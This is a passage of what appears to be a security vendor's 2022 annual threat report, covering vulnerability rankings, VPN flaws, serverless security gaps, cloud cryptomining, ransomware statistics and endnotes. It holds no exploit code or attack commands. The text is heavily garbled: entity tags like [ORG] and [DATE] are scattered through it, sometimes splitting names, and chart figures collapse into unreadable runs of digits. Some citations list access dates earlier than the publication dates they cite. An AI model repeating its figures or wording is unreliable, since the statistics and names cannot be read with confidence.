[WORK_OF_ART] Resolution [WORK_OF_ART] Before [WORK_OF_ART] File [WORK_OF_ART] Access [WORK_OF_ART] CWE-119 [ORG] Improper [ORG] Restriction [ORG] of [ORG] Operations within the Bounds of a Memory Bu\ufb00er CWE-749 Exposed Dangerous Method or Function CWE-78 Improper Neutralization of Special Elements used in an [ORG] OS [ORG] Command CWE-129 [ORG] Improper [ORG] Validation [ORG] of [ORG] Array Index32932420712582695755393934500Four out of the top \ufb01veCWEs involve heapmanipulation100150200250300350Figure [CARDINAL] 4 . Top [CARDINAL] 10 CWEs from [DATE] 2022 Published AdvisoriesPage [CARDINAL] 11 of [CARDINAL] 27Another issue with the expanding attack surface is the continuing strikes on virtual private network ( [ORG] VPN ) vulnerabilities . The use of VPNs spiked during the pandemic,25 and they have been integral to many business operations since . In our mid [DATE] - [DATE] year roundup , we reported on the detected attacks targeting certain VPN vulnerabilities , and this threat has continued through [DATE] the [DATE] end [DATE] of [DATE] 2022.The top tracked vulnerability is still the [ORG] Fortinet path traversal vulnerability CVE-2018 - 13379 which occurs in [ORG] Fortinet \u2019s FortiGate SSL ; and other highly targeted flaw was an arbitrary file reading vulnerability involving Pulse Secure Pulse Connect Secure ( PCS).FortinetPulse [PRODUCT] SecureCitrix SystemsCVE- 40684CVE-2019 [QUANTITY] - 11510CVE- [QUANTITY] 2019- ( Malware)DV-39360DV-39352DV-39364SONICWALLCVE-2021 - 20016DV-39727 managing underlying infrastructure . The services are for managing business operations such as built - in scalability , operability in multiple regions , and cost manageability . Serverless technology allows developers to upload code to a specific service without worrying about infrastructure maintenance , scalability , and availability . [PERSON] Weak [PERSON] Areas in Serverless SecurityIn 2022 , we investigated the security of these serverless platforms and pinpointed weak areas that could potentially be abused by attackers . These serverless computing services are being used by businesses to oversee complex processes and house information integral to business operations . Handling and managing secrets , as well as sensitive data , should also be a concern for both the provider and user of services . Mobile back endsChatbots at scale- - -Handle input form [ORG] IoT sensorsProcess multimedia taskChange data capture or database updates . . .Schedule batch jobs , especially when intenseparallel computationor I / O is requiredHTTP Rest APIs and apps . . .Continuous integrationpipelinesStream processingat scaleMicroservicesorchestration to supportbusiness logic { . . . } - - - -Figure 5 . What serverless platforms can be used forMalicious actors have started to shift focus to cloud - oriented services because misconfiguration is a prolific problem , and serverless environments are the likely next target . Since serverless technology allows users to upload code to the service , securing endpoints and writing secure code is the user \u2019s responsibility . It is vital that misconfiguration issues are not introduced into the system through the users . We also concluded that the default configurations on cloud services are not the best options from a security perspective . Users should look to solutions involving hardening an operating system and see how the security steps should also be followed in the serverless world . Another red flag we noted in serverless security is that both the user and the CSPs do not properly secure secrets and access tokens . Recently there have been reports of multiple hacker teams26 that harvest CSP - specific secrets to take over the target \u2019s services or the whole account . Page [CARDINAL] 14 of [CARDINAL] 27One incident27 involved TeamTNT , a group known for stealing [ORG] Amazon [ORG] Web [ORG] Services ( AWS ) , [PERSON] Docker , and [PERSON] Linux [PERSON] Secure [PERSON] Shell ( [ORG] SSH ) credentials . The group breached cloud environments and specifically looked for sensitive environment variables.28 There were also reports29 of a supply - chain attack where a Python library had its code changed to start harvesting sensitive variable content . Figure [CARDINAL] 6 . [ORG] Trend [ORG] Micro \u2019s report on what happens when secrets stored as an environmental variable are unwittingly leaked.30The [ORG] CSP is responsible for the execution process of the serverless service , however , the user is the [CARDINAL] one deploying code into the serverless system . In our latest report,31 we simulated user - provided code vulnerabilities among serverless services provided by major CSPs in the market . Based on our evaluation of serverless environments , we found that the most concerning security gaps were in [ORG] Microsoft [ORG] Azure , for instance:\u2022\u2022There were sensitive environmental variables inside the [ORG] Microsoft [ORG] Azure environment ; if these are leaked , malicious actors can fully compromise the entire serverless environment . There was a default runtime image using a master password that allows privilege escalation in most Azure App Service deployments . Page [CARDINAL] 15 of [CARDINAL] 27User code vulnerabilityCode interpreterSpawn reverse shellOur serverAnalyze serverlessfunctionFigure [CARDINAL] 7 . Attack simulation of a serverless functionOne throughline we saw was that the user poses a daunting security risk . An unfamiliar user could misconfigure the cloud service and create a wider attack surface or could implement code with easily exploitable vulnerabilities . The State of Cloud - crypto [ORG] AttacksThe volatility of cryptocurrency and the seeming decline of profitability in cryptocurrency [PERSON] mining32 means that miner operators needed to find alternative methods and techniques . In [DATE] 2022 , we saw that these malicious actors were aiming to compromise cloud infrastructure instead of relying on less lucrative CPU - based operations . This is not a new development , but in [DATE] 2022 we reported that the frequency of attacks increased,33 keeping pace with new cloud services being created and offered for free . Some scenarios allowed malicious actors to scale their attacks so that even [TIME] a [TIME] few [TIME] minutes [TIME] or [TIME] hours of compromise could generate significant profits . This fight for resources seems to be extreme \u2014 we saw how [CARDINAL] two attackers battled for control over victim \u2019s servers34 and that the control over a target can fluctuate within [DATE] a [DATE] day . These groups use kill scripts that help get rid of competing cryptocurrency miners while also strengthening their obfuscation and persistence mechanisms . Page [CARDINAL] 16 of 271515012101112119885123456 AM7738586691011121342 PMFigure 8 . A typical day showing the back - and - forth control of a cloud instance by Kinsing ( red ) and [CARDINAL] 8220 ( blue ) , with the numbersrepresenting inbound control connectionsEchoing the trend of ransomware actors focusing on Linux machines , we see that cryptominers are also doing the same \u2014 aiming for less protected targets with big payoffs . In [DATE] November [DATE] 2022 , we also intercepted a cryptocurrency mining attack using an advanced remote access trojan ( RAT ) named [FAC] the [FAC] CHAOS [FAC] Remote [FAC] Administrative [FAC] Tool35 that was targeting Linux machines . OS20212022LinuxMacOS8,2401,48813,228889Table [CARDINAL] 6 . [PERSON] Cryptominer [PERSON] Linux and MacOS counts in [DATE] 2021 versus [DATE] 2022Companies should be aware of the hidden issues involved with cryptocurrency miners . If this threat is present in a company \u2019s system , it is usually a sign that there are deeper security issues in the cloud infrastructure . The miner may not seem as serious a threat as data exfiltration or a ransomware infection but the method with which malicious actors enter a target \u2019s system is practically the same . Most actors , regardless of their motive or endgame , [ORDINAL] first exploit a vulnerable point in the organization \u2019s security . Having a miner not only impacts an organization \u2019s cloud infrastructure , it is also an indicator of poor security hygiene . A spike in CPU utilization rate from an average of 13 % to [CARDINAL] 100%A jump in electricity cost from US$ [MONEY] 20 [MONEY] to US$ 130 per month \u2014 a 600 % increase for a single cloud instance . Closure or disruption to the online services of a business . How will cryptomining affect cloud services?Page 17 of 27The Business Impact of [ORG] Cybersecurity [ORG] AttacksThe predatory nature of cybercrime means malicious actors specifically target organizations or technologies perceived as highly vulnerable and lucrative . As mentioned in the above sections , Linux - based threats are on the rise , mainly because unsecured internet of things ( [ORG] IoT ) devices are proliferating in enterprises and homes36 \u2014 targets ripe for the picking . Meanwhile , cryptocurrency mining operators are actively looking for ways to sneak onto corporate cloud infrastructure and silently leech resources . In [DATE] 2022 , we also saw how ransomware actors targeted small and midsize businesses operations . These are smaller organizations that can be held hostage when faced with cyberattacks since they have fewer IT security resources to avoid or respond to complex attacks . EmployeesSmall ( 1 - 200)Medium ( 201 [CARDINAL] - 1000)Large ( more than 1001)Attack Count1,213657497Table 7 . The distribution by organization size of successful ransomware attacks in terms of victim organizations in [DATE] 2022A [ORG] Trend [ORG] Micro global survey also showed that 52 % of all organizations have a supply chain partner that has been hit with a ransomware attack.37 Specifically , the software supply chain is where the problem is centered \u2014 the different components and tools being used within the organization can be exploited and abused by cybercriminals . And [ORDINAL] third parties may bring in new software to integrate into an organization . Cybercriminals have multiple options for entering a network , and one flaw can give them access to a whole range of systems and sensitive data . [CARDINAL] One of the key steps in managing the security of the software supply chain is having a software bill of materials ( [NORP] SBOM)38 or a formal record of the details and relationships of the software \u2019s components . Page [CARDINAL] 18 of 27Figure 9 . How supply chain partners can affect an organization \u2019s security , specifically in the case of ransomware attacksOur data shows that cybercriminals have been focusing on certain industries . Our research shows that manufacturing targets were top of mind for threat actors in [DATE] 2021 . However , the threats were more evenly dispersed in [DATE] 2022 , when government targets were the main targets of malicious attackers.515,3401 2ManufacturingGovernmentHealthcare314,771295,171Education206,953Technology155,6402 2Government282,611Manufacturing276,315Healthcare224,260Education192,812Technology172,5480200K400K600K0200K400K600KFigure 10 . Top [CARDINAL] five industries affected by malicious files in [DATE] 2022 compared to [CARDINAL] 2021Note : [CARDINAL] One malware detected multiple times in [CARDINAL] one machine is counted as one unique machineSource : Trend Micro Smart Protection Network infrastructurePage [CARDINAL] 19 of 27Strategies for [ORG] Defending [ORG] Against [ORG] an [ORG] Increasingly [ORG] Tactical [ORG] AdversaryThe growth of the digital attack surface is an aftereffect of enterprises navigating post - pandemic economies and trying to manage an increasingly remote workforce . Organizations continue to adopt new technology to keep up with hybrid styles of work , complex online operations and sales , burgeoning data storage needs , data protection requirements , and more . As stated in our mid [DATE] - [DATE] year report , this means that enterprises and organizations are scrambling to fill security gaps . Not to mention , cybersecurity experts are in increasingly short supply . This means that many organizations will require adaptable solutions and tactics that will counter threats in a more efficient way . Meanwhile , threat actors are leaning into more legitimate business tactics and professional operations , employing the same kinds of programs and corporate strategies and their victims . Not only are they innovating in terms of tools and targets , but they are also building resilient organizations that do not rely on singular methods of attack or a particular target pool . They can exploit multiple areas of the attack surface in a single campaign . A skills shortage means that organizations need a more efficient and holistic security solution ; ideally , one that can aggregate multiple needs and actions into one platform . Here are some security practices organizations should keep in mind : \u2014 Asset management . Examine assets and determine their critical importance , potential vulnerabilities , the level of threatactivity , and how much threat intelligence is being gathered from the asset.\u2014\u2014Cloud security setups . Ensure that the cloud infrastructure is set up with security in mind to prevent attackers from capitalizing on known gaps and vulnerabilities . Proper security protocols . Prioritize updating software as soon as possible to minimize exploitation of vulnerabilities . Options such as virtual patching can help organizations while vendors provide their security updates . \u2014 Attack surface visibility . Monitor the different technologies and networks within the organization , as well as any securitysystem that protects them . It may be difficult to correlate different data points from siloed sources . Organizations need a comprehensive solution that manages the entire attack surface . Visibility is key , as well as the ability to correlate different indicators so that security teams can focus on the bigger picture . A unified platform can provide multilayered protection while helping reduce expenditures that would otherwise be spent on multiple security technologies . Page [CARDINAL] 20 of 27Threat Landscape146,408,535,569Overall threats blocked in [DATE] 2022In [DATE] 2022 , [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network , including [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service , [ORG] IoT [ORG] Reputation [ORG] Service , and [ORG] Smart [ORG] Home [ORG] Network , protected [ORG] Trend [ORG] Micro customers from [MONEY] more [MONEY] than [MONEY] 146 [MONEY] billion threats . Our year - on - year data shows a 55 % increase in overall blocked threats compared to [DATE] 2021 , there was also a substantial 242 % increase in blocked malicious files . The almost 70 billion malicious files we blocked include unique and non - unique infections , meaning we count reinfections as well . This is a likely factor in the number of worms we detected ( shown in Figure [CARDINAL] 16 ) . Worms are almost impossible to get rid of since their primary function is to remain in the network and propagate . A high number of viruses or file infectors also contribute to the number of files blocked.2021a 2022aEmail Threat blockedMalicious URLs blockedMalicious \ufb01les blocked79,945,411,1462,531,040,18560,925,991,94369,869,979,4253,468,559,50417,834,808,43880B03.5B080BMARS blockedSHN [PRODUCT] Attempts [PRODUCT] blockedIoTRS [PRODUCT] blocked36,547,9332,966,079,0483,465,31437,088,8363,073,227,6235,921,41440M03.5B06MEmail [PRODUCT] Reputation QueriesURL Reputation QueriesFile Reputation Queries96,888,106,0113,771,452,057,8042,080,322,556,49589,032,192,9113,353,131,929,8341,920,529,076,114100B04T02.5TMARS QueriesIoTRS Queries48,521,558,06137,496,287,64147,015,584,18530,838,792,86650B040B202220210000Figure 11 . A comparison of the numbers of blocked email , URL , and file threats , of email , URL , and file reputation queries , and ofblocked mobile app , [ORG] IoT , and [ORG] Smart [ORG] Home [ORG] Network threats in [DATE] 2021 and [CARDINAL] 2022Source : Trend Micro Smart Protection Network , including [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service , [ORG] IoT [ORG] Reputation [ORG] Service , and [ORG] Smart [ORG] Home [ORG] NetworkPage [CARDINAL] 21 of 27The regional distribution of the threats we track shows an interesting picture of the security landscape in terms of area . Notably , we see that ransomware threats are mainly concentrated in [LOC] Asia and the [LOC] Americas . Business email compromise ( [ORG] BEC ) threats were also mostly targeting victims in [GPE] America , and [LOC] Asia was top ranked in terms of mobile security issues . Email [PERSON] Mobile Non [PERSON] - Unique Ransomware0.8 % 20.8%15.6%12.6 % 0.2%0.7%26.3%3.3 % 10.0%9.5%0.1 % 15.3 % 3.3 % 6.8 % 0.1%0.4 % 14.0%1.3 % 9.9%26.5%27.0%0.9 % 11.3 % 5.2 % 7.4 % 0.2%0.6 % 14.3%0.8 % 14.0%0.2 % 11.1%1.5 % 9.5%0.6 % 2.2%0.5 % 4.3%0.2 % 15.3%21.4%21.5%22.6%26.2%41.5%40.5%22.3%7.7 % 1.5%10.3 % 1.6%11.7%1.4%13.4 % 0.4%15.5%0.6%12.9 % 0%4.9 % 0.8%2.5 % 2.2%10.7 % 1.5%0.3 % 10.8%19.3%18.4%0.2%22.9%10.4%15.3%0.3 % 9.4 % 7.9%32.2%1.2%1.3%0.1%2.0 % 6.7%34.7%6.0 % 0.1%74.4%75.0%50.0%50.2%49.9%49.9%50.6%49.9%50.0%49.9%50.0%50.0%50.0%50.0%49.9%50.1%50.5%3.1%034.2%20%44.9%60%16.3 % 1.5 % [DATE] 0%80%100%40%AfricaAmericasAsiaEuropeOceaniaOthersFigure [DATE] 12 . The regional distribution of threats tracked by [ORG] Trend [ORG] Micro in [DATE] 2022 including : email , URL , and file threats , blocked mobileapps , [ORG] IoT , and [ORG] Smart [ORG] Home [ORG] Network threats . Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] Network , including [ORG] Mobile [ORG] App [ORG] Reputation [ORG] Service , [ORG] IoT [ORG] Reputation [ORG] Service , and [ORG] Smart [ORG] Home [ORG] NetworkWebshells are malicious scripts that allow threat actors to compromise web servers and launch attacks . They were the top detected malware of [DATE] the [DATE] year , and there was a 103 % spike in web shell detections from [DATE] 2021 [DATE] to [DATE] 2022 . Emotet detections were [ORDINAL] second in our rankings \u2014 it was not in the top [CARDINAL] ten in [DATE] 2021 , but [DATE] 2022 saw a resurgence . In terms of ransomware , [ORG] LockBit and [ORG] BlackCat were the top families present in [DATE] 2022.Page [DATE] 22 of [CARDINAL] 271 [CARDINAL] 2COINMINERWEBSHELL150,909149,290ULISEWCRY145,32197,585DOWNAD71,328NEMUCOD [CARDINAL] 66,149DLOADER59,783SALITY54,885 2NEGASTEAL303,399249,949192,658NEMUCOD125,204POWLOAD124,443DLOADER117,085COINMINER110,638FAREITLOKI96,53394,164DRIDEX75,0650175K350K0175K350KFigure 13 . The top [CARDINAL] 10 malware families in terms of detections in [DATE] 2021 compared to [CARDINAL] 2022Source : Trend Micro Smart Protection [DATE] Network3,0012,7811,9801,816LockBitBlackCatContiHive1,156BazarLoaderBlackByte835Black [DATE] Basta475Noko [DATE] 240Bastacrypt21701,7503,500Figure [DATE] 14 . The top ransomware families in [CARDINAL] 2022Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] NetworkPage [CARDINAL] 23 of 27JanFebMarAprMayJunRansom . NOESCAPE.ANo New CHEERSCRYPT.ARansom . Win64 . KEVERSEN.ARansom . [GPE] MSIL . [GPE] ZAGREUS.ARansom . Win32 . STORAGECRYPT.ARansom . Win32 . LORENZ.ARansom . Win32 . EVILNOMINATUS.ARansom . [GPE] MSIL . PALANG.ARansom . Win32 . [GPE] BLAZE.A12345Total214312345JulAugSepOctNovDecRansom . Win32 . USELESSDISK.ARansom . PS1 . [GPE] BEBACK.ARansom . Win32.GORF.ARansom . [GPE] MSIL . PENTERWARE.ARansom . Win32 . HMBRAN.ARansom . Win32 . [PERSON] WRLDECODING.ANo [PERSON] New [PERSON] FamiliesRansom . Win32 . PLAYDE.ARansom . [GPE] MSIL . CRYPTATO.ARansom . Win32 . BEIJIRAN.ARansom . Win64 . PANDORA.ARansom . Win64 . VICESOCIETY.ARansom . Win.32 . SCHOOBOS.ARansom . [GPE] MSIL . MALLOX.ARansom . Win64 . BLOODY.ATotal41353Table [CARDINAL] 8 . The new ransomware families detected in [CARDINAL] 2022Source : [ORG] Trend [ORG] Micro [ORG] Smart [ORG] Protection [ORG] NetworkThere was a 1.5 % year - on - year decrease in blocked malicious apps in [DATE] 2022.Page [DATE] 24 of 272021202237,088,83636,547,933010M20M30M40MFigure 15 . A comparison of blocked malicious apps in [DATE] 2021 and [CARDINAL] 2022Source : [ORG] Trend [ORG] Micro [ORG] Mobile [ORG] App [ORG] Reputation [ORG] ServiceThere was a spike in malicious file detections in [DATE] 2022 , and when investigating these files we were able to dissect the types of malware our products blocked . There was an 11.1 % decrease of hacktool usage , it is likely that some these hack tools were used in ransomware deployment . The tool [GPE] Bloodhound was most used in [DATE] 2022 , while [PERSON] Mimikatz was most used in [DATE] 2021 . There was a massive increase in backdoor detections , 86.2 % specifically . These backdoors mostly targeted web server platform vulnerabilities.2022a2021a2022 [DATE] 202194,350,85223,745,886106,189,699140,649,033204,197,723205,853,575177,046,996Backdoor12,940,837Hacktool21,107,571RansomTrojanspy [CARDINAL] 6,922,974 [DATE] 7,821,658Virus8,595,060WormOthers47,501,29319,418,881050M100M150M200M250MFigure [DATE] 16 . Comparison of malware types blocked in malicious files in [DATE] 2021 and [CARDINAL] 2022Page [CARDINAL] 25 of [CARDINAL] 27Endnotes1 [PERSON] Rami [PERSON] Sass . ( [DATE] Nov. [DATE] 14 , [DATE] 2022 ) . [PERSON] Forbes . \u201c [WORK_OF_ART] A [WORK_OF_ART] New [WORK_OF_ART] Approach [WORK_OF_ART] Is [WORK_OF_ART] Needed [WORK_OF_ART] To [WORK_OF_ART] Close [WORK_OF_ART] The [WORK_OF_ART] Cybersecurity [WORK_OF_ART] Talent [WORK_OF_ART] Gap . \u201d Accessed onMar . [DATE] 1 , [DATE] 2022 , at : Link.2 [PERSON] Feike [PERSON] Hacquebord , [PERSON] Stephen [PERSON] Hilt , and [PERSON] David [PERSON] Sancho . ( [DATE] Dec. [DATE] 15 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] The [WORK_OF_ART] Future [WORK_OF_ART] ofRansomware . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.3 Pieter Arntz . ( [DATE] Jan. [DATE] 23 , [DATE] 2023 ) . [GPE] Malwarebytes . \u201c Ransomware revenue significantly down over [DATE] 2022 . \u201d Accessed on [DATE] Mar. [DATE] 1,2022 , at : [ORG] Link.4 [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] Oct. [DATE] 27 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [PERSON] Ransomware [PERSON] Spotlight : [ORG] BlackCat . \u201d Accessed on Mar.1 , [ORG] 2022 , at : [ORG] Link.5 [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] Dec. [DATE] 7 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [PERSON] Ransomware [PERSON] Spotlight : [GPE] Cuba . \u201d Accessed on [DATE] Mar. [DATE] 1,2022 , at : [ORG] Link.6 [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] Dec. [DATE] 1 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] Ransomware [WORK_OF_ART] Spotlight : [WORK_OF_ART] Conti . \u201d Accessed on [DATE] Mar. [DATE] 1,2022 , at : [FAC] Link.7 [FAC] Eduard [FAC] Kovacs . ( [DATE] May [DATE] 23 , [DATE] 2022 ) . Security Week . \u201c [WORK_OF_ART] Conti [WORK_OF_ART] Ransomware [WORK_OF_ART] Operation [WORK_OF_ART] Shut [WORK_OF_ART] Down [WORK_OF_ART] After [WORK_OF_ART] Brand [WORK_OF_ART] Becomes Toxic\u201d . Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.8 [PERSON] Lawrence [PERSON] Abrams . ( [DATE] May [DATE] 19 , [DATE] 2022 ) . [PERSON] Bleeping [PERSON] Computer . \u201c [PERSON] Conti ransomware shuts down operation , rebrands into smallerunits . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.9 Nathaniel Morales et al . ( [DATE] Dec. [DATE] 16 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] Agenda [WORK_OF_ART] Ransomware [WORK_OF_ART] Uses [WORK_OF_ART] Rust [WORK_OF_ART] to [WORK_OF_ART] Target [WORK_OF_ART] More [WORK_OF_ART] VitalIndustries . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : [ORG] Link.10 [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] Aug. 31 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] Defending [WORK_OF_ART] The [WORK_OF_ART] Expanding [WORK_OF_ART] Attack Surface : Trend Micro2022 Midyear Cybersecurity Report . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.11 Janus Agcaoili et al . ( [DATE] Jun. [DATE] 15 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] Ransomware [WORK_OF_ART] Double [WORK_OF_ART] Extortion [WORK_OF_ART] and Beyond : REvil , [PERSON] Clop , [ORG] andConti . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.12 [PERSON] Feike [PERSON] Hacquebord , [PERSON] Stephen [PERSON] Hilt , and [PERSON] David [PERSON] Sancho . ( [DATE] Dec. [DATE] 15 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [WORK_OF_ART] The [WORK_OF_ART] Future [WORK_OF_ART] ofRansomware . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.13 [ORG] Trend [ORG] Micro [ORG] Research . ( [DATE] Oct. [DATE] 27 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Security [ORG] News . \u201c [PERSON] Ransomware [PERSON] Spotlight : [ORG] BlackCat . \u201d Accessed on Mar.1 , [ORG] 2022 , at : Link.14 [PERSON] Feike [PERSON] Hacquebord , [PERSON] Stephen [PERSON] Hilt , and [PERSON] David [PERSON] Sancho . ( [DATE] Dec. [DATE] 15 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [PRODUCT] Ransomware BusinessModels : [PRODUCT] Future [PRODUCT] Pivots and Trends . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.15 Tech Target . ( [DATE] July [DATE] 2017 ) . [ORG] Tech [ORG] Target . \u201c [ORG] Bug [ORG] Bounty [ORG] Program . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : [PERSON] Link.16 [PERSON] Ian [PERSON] Kenefick , [PERSON] Lucas [PERSON] Silva , and [PERSON] Nicole [PERSON] Hernandez . ( [DATE] Oct. [DATE] 12 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c Black Basta Ransomware GangInfiltrates Networks via [ORG] QAKBOT , [ORG] Brute [ORG] Ratel , and Cobalt Strike . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.17 [PERSON] Junestherry [PERSON] Dela [PERSON] Cruz . ( [DATE] Jan. 17 , [DATE] 2023 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [ORG] Batloader [ORG] Malware Abuses [PERSON] Legitimate [PERSON] Tools , [ORG] UsesObfuscated JavaScript [PERSON] Files in Q4 2022 Attacks . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.18 [PERSON] Ian [PERSON] Kenefick , [PERSON] Lucas [PERSON] Silva , and [PERSON] Nicole [PERSON] Hernandez . ( [DATE] Oct. [DATE] 12 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c Black Basta Ransomware GangInfiltrates Networks via [ORG] QAKBOT , [ORG] Brute [ORG] Ratel , and Cobalt Strike . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : [ORG] Link.19 [ORG] Trend [ORG] Micro [ORG] Research . ( n.d . ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c What Is Apache Log4J ( Log4Shell ) Vulnerability ? \u201d Accessed onMar . [DATE] 1 , [DATE] 2022 , at : Link . Page [CARDINAL] 26 of 2720 Trend Micro Research . ( n.d . ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c What Is Apache Log4J ( Log4Shell ) Vulnerability ? \u201d Accessed onMar . [DATE] 1 , [DATE] 2022 , at : Link.21 WP Editorial Staff . ( n.d . ) . [ORG] WPBeginner . \u201c What is : Apache . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.22 [ORG] VMWare . ( n.d . ) . Spring . \u201c [WORK_OF_ART] Spring [WORK_OF_ART] Framework . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.23 Sean Lyngaas . ( [DATE] Dec. [DATE] 14 , [DATE] 2022 ) . [ORG] CNN Politics . \u201c [GPE] US warns [CARDINAL] hundreds [CARDINAL] of [CARDINAL] millions of devices at risk from newly revealedsoftware vulnerability . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.24 Lily [PERSON] Hay [PERSON] Newman . ( [DATE] Aug. [DATE] 11 , [DATE] 2022 ) . Wired . \u201c [WORK_OF_ART] Sloppy [WORK_OF_ART] Software [WORK_OF_ART] Patches Are a \u2018 Disturbing Trend \u2019 . \u201d Accessed on Mar. 1 , 2022,at : Link.25 [PERSON] Rae [PERSON] Hodge . ( [DATE] Apr. [DATE] 23 , [DATE] 2020 ) . [ORG] CNET . \u201c VPN use surges during the coronavirus lockdown , but so do security risks . \u201dAccessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.26 [PERSON] David [PERSON] Fiser and [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] Aug. 17 , [DATE] 2022 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] Analyzing [WORK_OF_ART] the [WORK_OF_ART] Hidden [WORK_OF_ART] Danger [WORK_OF_ART] of [WORK_OF_ART] EnvironmentVariables [WORK_OF_ART] for [WORK_OF_ART] Keeping [WORK_OF_ART] Secrets . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.27 [PERSON] David [PERSON] Fiser and [PERSON] Alfredo [PERSON] Oliveira . ( [DATE] Mar. 9 , [DATE] 2021 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c TeamTNT [PERSON] Continues [PERSON] Attack on the Cloud , TargetsAWS Credentials . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.28 [ORG] Trend [ORG] Micro . ( [DATE] Feb. [DATE] 2 , [DATE] 2023 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] Research [WORK_OF_ART] Exposes [WORK_OF_ART] Azure [WORK_OF_ART] Serverless [WORK_OF_ART] Security [WORK_OF_ART] Blind [WORK_OF_ART] Spots . \u201d [PERSON] Accessedon [PERSON] Mar. [DATE] 1 , [DATE] 2022 , at : Link.29 [CARDINAL] 28 . Ax Sharma . ( [DATE] May [DATE] 24 , [DATE] 2022 ) . [PERSON] Bleeping [PERSON] Computer . \u201c [WORK_OF_ART] Popular [WORK_OF_ART] Python and [ORG] PHP libraries hijacked to steal AWS keys . \u201dAccessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.30 [ORG] Trend [ORG] Micro . ( [DATE] Jul. 13 , [DATE] 2022 ) . [ORG] YouTube . \u201c [WORK_OF_ART] Proof [WORK_OF_ART] of [WORK_OF_ART] Concept ( [ORG] POC ): When Secrets Stored as an [WORK_OF_ART] Environmental [WORK_OF_ART] Variable [WORK_OF_ART] are(Unwittingly ) Leaked . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : [ORG] Link.31 [ORG] Trend [ORG] Micro . ( [DATE] Feb. [DATE] 2 , [DATE] 2023 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] Research [WORK_OF_ART] Exposes [WORK_OF_ART] Azure [WORK_OF_ART] Serverless [WORK_OF_ART] Security [WORK_OF_ART] Blind [WORK_OF_ART] Spots . \u201d [PERSON] Accessedon [PERSON] Mar. [DATE] 1 , [DATE] 2022 , at : Link.32 [PERSON] George [PERSON] Kalpudis . ( [DATE] Jan [DATE] 2 , [DATE] 2023 ) . [PERSON] Coin [PERSON] Desk . \u201c What Will It Take for [ORG] Bitcoin [ORG] Mining [ORG] Companies [ORG] to [ORG] Survive in 2023?\u201dAccessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.33 [PERSON] Alfredo [PERSON] Oliveira and [PERSON] David [PERSON] Fiser . ( [DATE] Sept. [DATE] 10 , [DATE] 2023 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] War [WORK_OF_ART] of [WORK_OF_ART] Linux [WORK_OF_ART] Cryptocurrency Miners : [WORK_OF_ART] A [WORK_OF_ART] Battlefor [WORK_OF_ART] Resources . \u201d Accessed on [DATE] Mar. [DATE] 1 , [DATE] 2022 , at : Link.34 [PERSON] Alfredo [PERSON] Oliveira and [PERSON] David [PERSON] Fiser . ( [DATE] Sept. [DATE] 10 , [DATE] 2023 ) . [ORG] Trend [ORG] Micro [ORG] Research . \u201c [WORK_OF_ART] War [WORK_OF_ART] of [WORK_OF_ART] Linux [WORK_OF_ART] Cryptocurrency Miners : [WORK_OF_ART] A [WORK_OF_ART] Battlefor 